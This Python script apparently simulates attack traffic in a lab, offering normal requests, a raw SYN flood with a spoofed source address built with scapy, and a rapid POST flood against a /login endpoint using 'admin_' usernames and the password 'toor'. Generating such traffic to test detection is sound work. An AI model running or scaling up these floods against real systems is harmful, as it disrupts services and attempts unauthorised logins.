# attacker_sim.py
import time
import requests
from scapy.all import IP, TCP, send

TARGET_IP = "10.10.28.241"
TARGET_PORT = 5000

def simulate_normal_user():
    print("[*] Simulating normal user traffic...")
    for _ in range(5):
        requests.get(f"http://{TARGET_IP}:{TARGET_PORT}/")
        time.sleep(0.5)
    print("[+] Normal traffic sent.")

def simulate_syn_flood():
    print("[!] Launching Raw SYN Flood Attack (DoS)...")
    # إرسال حزم SYN بدون إكمال الـ Handshake
    for _ in range(50):
        pkt = IP(src="198.51.100.5", dst=TARGET_IP) / TCP(dport=TARGET_PORT, flags="S", seq=1000)
        send(pkt, verbose=False)
    print("[+] SYN Flood burst transmitted.")

def simulate_http_bruteforce():
    print("[!] Launching High-Rate HTTP POST Flood...")
    for i in range(40):
        try:
            requests.post(
                f"http://{TARGET_IP}:{TARGET_PORT}/login",
                json={"user": f"admin_{i}", "pass": "toor"},
                timeout=0.2
            )
        except Exception:
            pass
    print("[+] HTTP Flood completed.")

if __name__ == "__main__":
    choice = input("Select Attack Scenario (1: Normal, 2: SYN Flood, 3: HTTP Flood): ")
    if choice == "1":
        simulate_normal_user()
    elif choice == "2":
        simulate_syn_flood()
    elif choice == "3":
        simulate_http_bruteforce()